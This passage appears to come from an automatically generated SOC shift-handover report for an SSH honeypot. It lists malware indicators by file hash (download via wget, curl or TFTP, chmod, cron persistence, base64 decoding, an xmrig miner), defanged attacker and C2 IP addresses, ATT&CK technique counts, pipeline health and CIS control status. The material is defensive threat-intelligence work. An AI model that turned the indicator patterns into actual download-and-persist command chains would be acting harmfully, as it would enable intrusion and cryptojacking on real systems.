- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `78.128.112[.]74` | BG | Lir.bg EOOD | **100** ⚠️ | 50 |
| `40.67.165[.]94` | US | Microsoft Corporation | **100** ⚠️ | 5 |
| `66.132.186[.]181` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `118.121.202[.]149` | CN | CHINANET Sichuan province network | **100** ⚠️ | 44 |
| `130.12.181[.]21` | SI | Netiface LLC | **100** ⚠️ | 21 |
| `59.28.174[.]77` | KR | Korea Telecom | **100** ⚠️ | 36 |
| `165.154.6[.]112` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 28 |
| `185.230.216[.]5` | GB | World4You Internet Services GmbH | **100** ⚠️ | 18 |
| `185.233.3[.]95` | KZ | Mws Cloud, Limited Liability Company | **100** ⚠️ | 50 |
| `114.217.10[.]60` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 310 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 304 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 120 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 37 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 33 |

---

## 🔕 False Positive Summary (70 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 24 |
| AbuseIPDB score 1 below threshold 25 | 3 |
| AbuseIPDB score 11 below threshold 25 | 3 |
| AbuseIPDB score 12 below threshold 25 | 5 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 4 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 493 cases |
| Tool 34  | Credential Extractor        | ✅ 3339 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 35 fingerprints |
| Tool 36  | Command Clustering          | ✅ 133 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 198 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 70 filtered (14.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 94 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 291 priority case(s) shown individually · 114 recon entry/entries in table (12 group(s) consolidating 30 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-19T19:47:03Z_
